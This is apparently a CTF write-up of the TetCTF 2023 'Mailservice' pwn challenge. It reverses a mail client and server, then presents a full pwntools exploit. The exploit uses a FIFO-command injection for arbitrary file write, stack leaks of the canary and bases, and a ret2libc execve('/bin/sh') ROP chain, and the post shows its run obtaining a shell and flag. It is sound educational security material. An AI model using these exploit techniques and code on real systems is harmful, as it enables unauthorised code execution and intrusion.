---
layout: post
title:  "TetCTF 2023: Mailservice"
categories: pwn
excerpt_separator: <!--end_excerpt-->
---
This challenge featured a client and server binary both running on the same system operating as a basic mail sending/receiving service. The mailserver binary was being run internally on the system, listening on a port(that port was hidden from us) whilst the mailclient binary is what was run on connection to the challenge.
<!--end_excerpt-->

I played this CTF with The WinRaRs and was the third to solve this challenge, and the first to solve with the intended solution.


Anyway, let's get into what that was!


## Summary
1. Send emails to update.event@hackemall.live to interface with FIFO pipe
2. Use this to create a custom mail with big size and little data for leaking
3. Manipulate this to leak a content file path and build a ROP payload
4. Activate buffer overflow by making it read too many bytes


[To skip to exploitation writeup](#interfacing-with-the-fifo)
## Reversing

### Mailserver
I decided to get into reversing the server first. From the Dockerfile, we can tell that the mail server and client are both in their own separate users and the flag belongs to the mail client, however since the client would be interfacing with the server I thought it would be helpful to understand the server first and foremost.

The first function that the mailserver binary calls looks like this
![open_files function]( https://i.imgur.com/BucOTI1.png)

It creates a FIFO named pipe in /home/mailserver/data called update.event, as well as setting some stirng to /home/mailserver/data/update.bin. More on this later.

It then calls a function I named `do_listen`. Binja got kinda confused with shorts(assuming they were pointers to strings) here so I'm not including a screenshot, but it opens a socket and listens on it at address 127.0.0.1, port 9999. I'm going to skip over some of the networking details since they're pretty unimportant for the challenge, despite the fact I reversed them pretty extensively.

The server then enters a loop like so
```c
    if ((open_files() == 0 && dolisten() == 0))
    {
        struct pollfd pollfds[0x2];
        memset(&pollfds, 0, 0x10);
        if (open_files() == 0)
        {
            pollfds[0].fd = eventfd;
            pollfds[0].events = 1;
            pollfds[1].fd = sockfd;
            pollfds[1].events = 1;
            while (true)
            {
                if (poll(&pollfds, 2, 0x1f4) > 0)
                {
                    if ((((int32_t)pollfds[0].revents) & 1) != 0)
                    {
                        handle_events();
                    }
                    if ((((int32_t)pollfds[1].revents) & 1) != 0)
                    {
                        int32_t var_54 = 0x10;
                        int64_t var_48 = 2;
                        int64_t var_40_1 = 0;
                        void var_38;
                        int32_t fd = accept(sockfd, &var_38, &var_54);
                        if (fd > 0)
                        {
                            if (setsockopt(((uint64_t)fd), 1, 0x14, &var_48, 0x10) >= 0)
                            {
                                handle_sock(fd);
                                close(fd);
                            }
                            else
                            {
                                close(fd);
                            }
                        }
                    }
                }
            }
        }
    }
```

Basically it polls both the FIFO and the socket on which its listening for events. If there's an event on the FIFO it calls a special function to handle it, if there's an event on the socket it calls a different function.

#### FIFO Handling
```c
    if (read(eventfd, &cmd, 3) == 3)
    {
        int32_t rax_3 = cmd;
        int32_t len;
        void data;
        if (rax_3 == 'ATF')
        {
            if (read(eventfd, &data, 3) == 3)
            {
                __isoc99_sscanf(&data, &data_2799, &len);
                memset(&data, 0, 0x400);
                if (read(eventfd, &data, ((int64_t)len)) == ((int64_t)len))
                {
                    FILE* filp = fopen(bin_path, &data_27a0);
                    if (filp != 0)
                    {
                        fseek(filp, 0, 2);
                        int32_t size = ftell(filp);
                        fseek(filp, 0, 0);
                        int64_t ptr = calloc(((int64_t)((size + len) + 1)), 1);
                        if (ptr != 0)
                        {
                            memcpy(ptr, &data, ((int64_t)len));
                            fread((((int64_t)len) + ptr), 1, ((int64_t)size), filp);
                            fseek(filp, 0, 0);
                            fwrite(ptr, 1, ((int64_t)(size + len)), filp);
                            fclose(filp);
                            free(ptr);
                        }
                        else
                        {
                            fclose(filp);
                        }
                    }
                }
            }
        }
        else if (rax_3 > 'ATF')
        {
            if (rax_3 == 'SET')
            {
                memset(&data, 0, 0x400);
                if (read(eventfd, &data, 3) == 3)
                {
                    __isoc99_sscanf(&data, &data_2799, &len);
                    memset(&data, 0, 0x400);
                    if (read(eventfd, &data, ((int64_t)len)) == ((int64_t)len))
                    {
                        if (bin_path != 0)
                        {
                            free(bin_path);
                        }
                        bin_path = strdup(&data);
                    }
                }
            }
            else if ((rax_3 == 'NEW' && read(eventfd, &data, 3) == 3))
            {
                __isoc99_sscanf(&data, &data_2799, &len);
                memset(&data, 0, 0x400);
                if (read(eventfd, &data, ((int64_t)len)) == ((int64_t)len))
                {
                    FILE* rax_24 = fopen(bin_path, &data_279c);
                    if (rax_24 != 0)
                    {
                        fwrite(&data, 1, ((int64_t)len), rax_24);
                        fclose(rax_24);
                    }
                }
            }
        }
        else if (rax_3 == 'UPD')
        {
            system("echo 1 > /tmp/need_update");
        }
        else if ((rax_3 == 'ATE' && read(eventfd, &data, 3) == 3))
        {
            __isoc99_sscanf(&data, &data_2799, &len);
            memset(&data, 0, 0x400);
            if (read(eventfd, &data, ((int64_t)len)) == ((int64_t)len))
            {
                FILE* rax_63 = fopen(bin_path, &data_27a0);
                if (rax_63 != 0)
                {
                    fseek(rax_63, 0, 2);
                    fwrite(&data, 1, ((int64_t)len), rax_63);
                    fclose(rax_63);
                }
            }
        }
    }
```
Pretty long, right? Simplified,
1. It first reads 3 bytes from the FIFO. These act as a "command", which can either be ATF, SET, NEW, UPD or ATE
2. In the case of any command that is not UPD, it also reads a decimal string of 3 bytes(e.g "004") as the length for the rest of the data.

The commands are as follows,

* ATF(which presumably stands for "Add to Front") adds the data specified to the *beginning* of the file specified in `bin_path`
* SET sets `bin_path` to the file path specified
* NEW overwrites the data in `bin_path` with the data specified
* UPD runs `echo 1 > /tmp/need_update`
* ATE(which presumably stands for "Add to End") adds the data specified to the *end* of the file specified in `bin_path`

This appears to work as some kind of API to push updates. It's likely only intended to be usable by a local user.

There's no forseeable vulns here(besides the fact this gives arbitrary file write) or any way to interact with this file. More on that later.

#### Socket handling
The function I named `handle_socket` is quite long and most of it is not necessary to understand for this challenge. To summarise, the mail server interacts with its clients through data packets of length STRICTLY 0x408 bytes.
```c
struct packet {
	uint32_t signal;
	uint32_t len;
	char buf[0x400];
}
```

NOTE: In my binary ninja outputs I named signal `cmd_or_signal` and I named buf `data`.

In serverbound packets, `signal` specifies what operation the user wants to do (login, register, read mail or send mail). In clientbound packets, `signal` specifies whether the operation was successful or not. `len` gives the length of the data in `buf`, in bytes.

The client communicates information to the server in form `var1=xxx;var2=xxx;var3=xxx`. It uses this to communicate usernames and passwords.

Details for each key process are outlined here
```
Register - /home/mailserver/data/users/USERNAME is created. /home/mailserver/data/users/USERNAME/passwd has the password(no hash) written to it.

Login - The password is checked. If it is correct, the server sends back an access key NFA9BuWqoExEX5Ll. The access key gives the client unrestricted access to do any operation as any user, however since we can only interface with the mailserver through the limited mailclient, this is not exploitable.

Read mail - /home/mailserver/USERNAME is read and sent back to the client.

Send mail - the variables mailto, subject and content_path are read. At /home/mailserver/MAILTO, the data "SUBJECT|CONTENT_PATH" is written.
```

And that's it for the mail server. Onto the mailclient!

### Mailclient
So, as expected, when logging in it builds the packet of form username=%s;password=%s and if the login is successful, saves the access key. Registering is relatively uninteresting. Reading and sending mail is when it gets interesting.

#### Sending mail

Removing the packet interaction with the server, the main code looks like this.
```c
    printf("Send to: ");
    void var_518;
    __isoc99_scanf("%256[a-zA-Z0-9.@]%*c", &var_518);
    __isoc99_sscanf(&var_518, "%[a-zA-Z0-9.]@%[a-zA-Z0-9.]", &var_418, &var_318);
    if (strcmp(&var_318, "hackemall.live") != 0)
    {
        puts("Only support domain hackemall.li…");
    }
    else
    {
        printf("Subject: ");
        void var_218;
        __isoc99_scanf("%256[a-zA-Z0-9.@#$^&*() \/<>?]%*…", &var_218);
        char* rax_8 = make_tempfile();
        if (rax_8 == 0)
        {
            puts("Create tempfile error!");
        }
        else
        {
            void tempfile_path;
            snprintf(&tempfile_path, 0x100, "/tmp/mail/content/%s", rax_8);
            free(rax_8);
            printf("Content's size: ");
            int32_t content_size;
            __isoc99_scanf("%d%*c", &content_size);
            if (content_size > 0x800)
            {
                content_size = 0x800;
            }
            void var_520;
            snprintf(&var_520, 8, "%04d", ((uint64_t)content_size));
            int64_t rax_18 = calloc(((int64_t)(content_size + 1)), 1);
            int32_t content_fd = open(&tempfile_path, 0x41, 0x1ff);
            if (content_fd < 0)
            {
                puts("Cann't create content file!");
            }
            else
            {
                write(content_fd, &var_520, 4);
                printf("Content: ");
                read(0, rax_18, ((uint64_t)content_size));
                write(content_fd, rax_18, ((uint64_t)content_size));
                close(content_fd);
                chmod(&tempfile_path, 0x1ff);
                free(rax_18);
```

Note that the regex for the part of the email before the @ is `[a-zA-Z0-9.]`. This will be crucial later.

The subject is read in as a 256-byte string(maximum) of characters in the set `[a-zA-Z0-9.@#$^&*() \/<>?]`, which is pretty unrestrictive, and even allows slashes. Pipes are not allowed. There is a check for this on the server side as well.

It then calls a function I named `make_tempfile`, source below.
![source code](https://i.imgur.com/HZnDnCX.png)

Binary ninja isn't great at undoing optimisations but basically that code reads 16 random bytes from urandom, doing a modulus of each one and using that to pick a letter. The result is a 16-byte random string of capital and lowercase letter that is far from guessable.

At /tmp/mail/content/XXXXXXXXXXXXXXXX, the mail's content is written(remember `content_path` in the mail server?). It is prefixed with a 4-character decimal string describing the size, e.g "0300". The maximum size is enforced to be 0x800.

#### Receiving mail
```c
                    char* rax_26 = strrchr(&var_c28.data, 0x7c);
                    if (rax_26 == 0)
                    {
                        puts("Mail syntax error!");
                        close(rax_3);
                    }
                    else
                    {
                        *(int8_t*)rax_26 = 0;
                        printf("Subject: %s\n", &var_c28.data);
                        int32_t rax_33 = open(&rax_26[1], 0);
                        if (rax_33 < 0)
                        {
                            puts("Content not found!");
                            close(rax_3);
                        }
                        else
                        {
                            void var_820;
                            memset(&var_820, 0, 8);
                            if (read(rax_33, &var_820, 4) == 4)
                            {
                                int32_t rax_44 = atoi(&var_820);
                                void var_818;
                                memset(&var_818, 0, 0x800);
                                read(rax_33, &var_818, ((uint64_t)rax_44));
                                write(1, &var_818, ((uint64_t)rax_44));
                                close(rax_33);
                                goto label_2211;
                            }
                            puts("Content not found!");
                            close(rax_33);
                            close(rax_3);
```

Here is where it gets interesting. It queries the mail server for the mail file contents, which are stoed in /home/mailserver/data/USERNAME. It outputs the subject, and then opens the content file. It first reads the first 4 bytes and runs `atoi` to convert it to an integer, and reads that many bytes into a buffer on the stack. This buffer is then written to stdout. **The size of the mail data isn't checked, which is where the vulnerability lies**. It's not immediately clear how we can even use that when the stack buffer is 0x800 in size anyway and when *sending* mail, the size is capped at 0x800. That's where something else comes in.

## Interfacing with the FIFO
We get two vulnerabilities here, one in the mail client and one in the mail server.

In the mail client - **the size of the mail data is not checked before it is read into a stack buffer**

In the mail server - **when sending email, it is not checked that the email is valid, nor that it actually exists**

Mail is sent to /home/mailserver/data/USERNAME. At first, I considered trying to execute a directory traversal attack by sending email to, for example, ../../pwned@hackemall.live, however the mailclient bans slashes in the email. However, **it permits full stops(or periods)**

That means that sending emails to update.event@hackemall.live will allow us to write data to /home/mailserver/data/update.event, interacting with the fifo's API. This is very powerful - a combination of SET and NEW gives arbitrary file write as the mailserver user. 

I built some simple functions for interacting with the mailclient.
```python
from pwn import *
e = ELF("./mailclient")
libc = ELF("./lib/libc.so.6")

context.binary = e

def login(email, password):
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", email)
    p.sendlineafter(": ", password)

def send(username, subject, content, content_size=None):
    if content_size is None:
        content_size = len(content)
    p.sendlineafter("> ", "3")
    p.sendlineafter(": ", f"{username}@hackemall.live")
    p.sendlineafter(": ", subject)
    p.sendlineafter(": ", str(content_size))
    p.sendafter(": ", content)

def read():
    p.sendlineafter("> ", "4")
    p.recvuntil(": ")
    subject = p.recvline()[:-1]
    data = p.recvuntil("*")[:-1]
    return subject, data
 
p = remote("139.162.36.205" if args.REMOTE else "localhost", 1337)

# We just need to interact with the mailclient's update.event file and that gives us arbitrary file write.
# From there, we can forge custom emails and achieve buffer overflows.

# Sending an email to update.event@hackemall.live will do it.

email = "day@hackemall.live"
password = "t"

username = email.split("@")[0]

login(email, password)
```
I registered an email at day@hackemall.live with password `t` manually.

The mail file format is simply `subject|content_path`, so we can put the entire thing that we want to send to the FIFO in the subject. The below function builds a simple packet.
```python
def build_packet(cmd, data,length=None):
    if length is None:
        length = len(data)
    # Builds an update.event packet(for ones that aren't UPD)
    return cmd + str(length).zfill(3).encode() + data
```
Finally, all that is necessary to send a command to update.event is sending an email to update.event@hackemall.live with the subject being what we want, for example NEW005PWNED. The content doesn't matter(yet), make it whatever you want!

```python
def build_packet(cmd, data,length=None):
    if length is None:
        length = len(data)
    # Builds an update.event packet(for ones that aren't UPD)
    return cmd + str(length).zfill(3).encode() + data

def send_event(data, content=None):
    if content is None:
        content = "I swear on my life, I always try, but in my eye, I can fly. Better luck next time.\n"
    send("update.event", data, content)
```
sure enough, `send_event(build_packet(b"NEW", b"PWNED\n"))` works(I tested using a docker image)
```
root@29b3c6292ea3:/home/mailserver/data# cat update.bin
PWNED 
```

## Getting leaks
```
┌──(kali㉿kali)-[~/CTFs/tet/mail/user_build]
└─$ pwn checksec mailclient  
[*] '/home/kali/CTFs/tet/mail/user_build/mailclient'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Canary and PIE, yep we'll definitely need good leaks. But how?

Return to the reading email code - it basically does
```c
read(fd, buf, SIZE);
write(1,buf,SIZE);
```
If size is arbitrarily big, then it'll dump loads of stack data and leaks can almost certainly be leveraged from that. Unfortunately, that might trigger the BOF early, right?

No, not if there just isn't much data there. If there's only one byte left in the file and you ask to read 1000, the read will just only read one byte. The mail client will then dump 1000 bytes.

All that's left is to somehow control the mail content. This isn't too hard though.
* SET file path to /tmp/evil
* use NEW to write custom mail content to /tmp/evil
* SET file path to /home/mailserver/data/day
* use NEW to write subject\|/tmp/evil
* Now we have mail with custom data!

Wait... no. We can't use new to write a pipe character, because all of the fifo API data is being sent through the subject. And the subject, remember, can't include pipes.

Well, now what? We can't instead simply edit the existing content path because the filename is unpredictable.

Recall that we aren't writing just the subject to update.event. We're writing subject + "\|" + content_path. We've been ignoring that but, it'll now become important.

What if our subject was NEW001, for example? The API would receive `NEW001|/tmp/...`, the only relevant parts being `NEW001|`. It would then write a pipe to the file.

Let's instead have the subject be NEW006PWNED. The API would receive `NEW006PWNED|`(since "PWNED" is 5 bytes, it would read the next byte as well, the pipe character). This let's us write a pipe character after the data we want! Afterwards, we simply use ATE to append the rest.

```python
def custom_mail(username, data, size=None):
    if size is None:
        size = len(data)
    if type(data) == str:
        data = data.encode()
    # Build a custom email
    send_event(build_packet(b"SET", b"/tmp/evil"))
    send_event(build_packet(b"NEW", str(size).zfill(4).encode() + data))
    send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
    send_event(build_packet(b"NEW", b"pwned",len("pwned") + 1)) # smuggle the pipe in since it will be after the subject and we cant put it in the subject manually
    send_event(build_packet(b"ATE", b"/tmp/evil"))
```

Sure enough, setting a size as high as 0x1000, we get lots and lots of leaks. After the buffer will be the canary, then the saved rbp, then the return address(giving binary base leak) and eventually `__libc_start_main_ret`. From there, it's trivial to extract the necessary information!


NOTE: The code in comments was what I used to enumerate the stack data. Sometimes the leaks fail for reasons I don't know, likely a null byte randomly occuring somewhere. We can restart easily.
```python
custom_mail(username, b"", size=0x10000) # Very high size despite not putting much in the file. This makes it over print, so we can get leaks before exploiting the BOF.

_, leaks = read()
if leaks == b'':
    log.failure("Leaks failed.")
    quit()
log.success("Leaks suceeded")

old_buf = leaks
leaks = leaks[0x808:]

canary = u64(leaks[:8])
log.info(f"Canary: {hex(canary)}")
"""
for i in range(8, len(leaks), 8):
    num = u64(leaks[i:i+8].ljust(8, b"\x00"))
    if num == 0:
        continue
    print(hex(num), i)
"""

e.address = u64(leaks[16:16+8]) - 0x2335
libc.address = u64(leaks[64:64+8]) - 0x29d90
log.info(f"Binary base: {hex(e.address)}")
log.info(f"Libc base: {hex(libc.address)}")
```

Sure enough, checking with `gdb -p $(pidof mailclient)`, these leaks are correct!

## Exploiting the BOF: Preparing the payload

We should be able to use the same principle to overwrite a large amount of data on the stack, achieving a buffer overflow and executing a simple ret2libc ROP chain to pop a shell. But, yet again, we will be screwed over by the restrictions on the subject field.

The subject field can only contain some specific bytes, most certainly not including null bytes and all the random characters that will be present in a ROP chain.

The same trick we used before won't work here. Although the content itself has no restrictions, the content itself is also stored in an unpredictable, and therefore unknowable, file path. I tried getting it to read the payload from /proc/self/fd/0 but that doesn't work since it's actually over a socket.

Wait, hold up, is it really that unknowable?

Recall again that the FIFO api also receives the content path at the end of the packet we send to it. That content can have literally anything we want in it, since it's unimportant. I previously put lyrics from 4 Morant(good song btw) in there but it could also contain anything, including a ROP payload. 

But how can we begin to leak it? Let's start again from smuggling the data into the packet.

Say I sent `NEW035|/tmp/...`(the length of /tmp/mail/content/ is 18, add 16 to that and you get 34, add 1 for the pipe to that and you get 35) This would write `|/tmp/...` to whatever file that was currently selected, but is that *actually* all that useful? How can we even read file data? It's not like we can select a content path file. How about a mail file?

Writing data to a mail file is a shout, since the subject is printed raw, and so data can be exfiltrated that way. However, if it begins with `|`, that won't be the subject, it'll be the content path, and setting that is useless.

This is where sscanf inner mechanics come in. The FIFO API reads the number by first grabbing 3 bytes and then passing them to `sscanf(bytes,"%d",&num)`. sscanf will stop when it hits an invalid character(in this case a character that isn't numeric or a plus or minus sign) but it will then **just write the number it already had**. So instead, imagine the FIFO API received the packet `NEW34|/tmp/...`. It would first read the command, `NEW`. It would then read the number `34|` and sscanf it, the result being `34` as the length. It would then read everything else as its data, successfully discarding the pipe!

So, sending `NEW34` as the subject of an email to update.event@hackemall.live will leak the file path of the contents into whatever file is currently selected. A little manipulation and we can get this to leak the file path through our email file.

I used execve as opposed to system because execve("/bin/sh",NULL,NULL) does the job just as well and when you use system there is often needless shenanigans with stack alignment and saved RBP being invalid. e.address + 0x4000 just serves as a dummy RBP value.
```python
rop = ROP(libc)
rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)

payload = flat(canary, e.address + 0x4000, rop.chain())

# Ok, now we need to construct the payload in a file. Not easy.
# We set the update file to /home/mailserver/data/day and then use NEW and some tomfoolery to dump the file path of some content file that contains the main par tof the payload into my mail
# Then, we can cleanly leak the file path(we dump it as the subject) and use existing primitives to build up the file until its suitable
# And use our regular old primitives to get it to read in the payload

send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
send_event(b"NEW" + b"34", payload) # Basically the data written will be NEW34|/tmp/mail/content/FILENAME . 34| will be sscanf'd to get the length as 34 and then the data will be read in as the rest
send_event(b"ATE" + b"001")
```
I use the trick we used previously in the Getting Leaks chapter to add a pipe in my mailfile so that it becomes valid. The mailfile now reads `FILENAMEBEINGLEAKED|` So the content is empty. This'll give an error, but not a game-breaking one, and the subject will be printed anyway.
```python
filname, _ = read()
log.success(f"Leaked filename: {filname.decode()}")
```
## Exploiting the BOF: Getting the payload onto the stack
There is now a file that we know the filepath of containing 4 bytes of data and then the ROP payload. This file needs to become a file containing 4 bytes of data corresponding to the length of the rest, some padding, and then the ROP payload. Everything that needs to be added is alphanumeric, so old methods will do. ATF finally becomes useful here - we want to add data to the front of the file, not after it.

```python
# Now ATF is actually useful. We have 4 bytes + payload. We want evil size + 0x804 filler bytes + 4 bytes + payload
# Unfortunately we cannot write that many bytes in the subject at a time. No worry, it's only a few iterations.

send_event(build_packet(b"SET", filname))
to_add = str(0x808 + len(payload)).zfill(4).encode() + b"A"*0x804

chunks = []
for i in range(0, len(to_add), 200):
    chunks.append(to_add[i:i+200])

for chunk in chunks[::-1]:
    send_event(build_packet(b"ATF", chunk))

mail_file(username, filname)
```

I put it in chunks of 200 for extra safety, remembering that the chunks need to be added in reverse order. Finally, I forge a mail file where the content is in whatever path I leaked. All that remains is to read the email and a shell will be popped!

They hinted that the flag filename will be weird as file read primitive is not enough so asterisk is needed.
```python
p.sendlineafter("> ", "4")
p.clean(0.2)
p.sendline("cd /home/mailclient")
p.sendline("cat flag*")
```

```
┌──(kali㉿kali)-[~/CTFs/tet/mail/user_build]
└─$ python3.10 exploit.py REMOTE
[*] '/home/kali/CTFs/tet/mail/user_build/mailclient'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/kali/CTFs/tet/mail/user_build/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 139.162.36.205 on port 1337: Done
[+] Leaks suceeded
[*] Canary: 0x1d5f307b787f8c00
[*] Binary base: 0x5590c0c00000
[*] Libc base: 0x7feaecc9a000
[*] Loaded 218 cached gadgets for './lib/libc.so.6'
[+] Leaked filename: /tmp/mail/content/6bMH5uabHh1GNIoc
[*] Switching to interactive mode
TetCTF{2b15f22179fc01196b2e673764e45a7f}
$ ls
flag_e6db1baa29d3df1eb307ff6a12c778da
mailclient
$ id
uid=1000(mailclient) gid=1000(mailclient) groups=1000(mailclient)
$ whoami
mailclient
$ 
[*] Interrupted
[*] Closed connection to 139.162.36.205 port 1337
```

Full exploit [here](https://github.com/Day91/Writeups/blob/master/TetCTF/exploit.py)
## Conclusion
That was a very refreshing challenge and definitely very unique. While it was more logic based and less memory corruption based, I think that was a nice difference and not something you usually see in CTFs. It was very distinctive without being toxic or extremely knowledge-based which isn't very regular in CTFs nowadays, so I thank [@chung96pwn](https://twitter.com/chung96vn) for the challenge!